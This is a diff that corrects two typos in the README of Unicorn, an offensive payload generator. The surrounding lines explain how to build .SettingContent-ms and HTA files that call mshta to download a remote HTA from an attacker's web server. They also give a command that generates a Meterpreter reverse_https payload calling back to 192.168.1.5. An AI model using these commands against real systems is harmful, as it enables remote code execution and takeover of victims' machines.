@@ -292,7 +292,7 @@ The four methods below on usage:
 
 HTA SettingContent-ms Metasploit: `python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms`  
 HTA Example SettingContent-ms: `python unicorn.py <cobalt_strike_file.cs cs ms`  
-HTA Example SettingContent-ms: `python unicorn.py <patth_to_shellcode.txt>: shellcode ms`  
+HTA Example SettingContent-ms: `python unicorn.py <path_to_shellcode.txt>: shellcode ms`  
 Generate .SettingContent-ms: `python unicorn.py ms`
 
 The first is a Metasploit payload, the second a Cobalt Strike, the third your own shellcode, and the fourth
@@ -311,7 +311,7 @@ mshta http://<apache_server_ip_or_dns_name/Launcher.hta.
 Then move the contents of the hta_attack to /var/www/html.
 
 Once the victim either clicks the .SettingContent-ms file, mshta will be called on the victim machine
-then download the Unicorn HTA file which has the code execution capabilites. 
+then download the Unicorn HTA file which has the code execution capabilities. 
 
 Special thanks and kudos to Matt Nelson for the awesome research
 
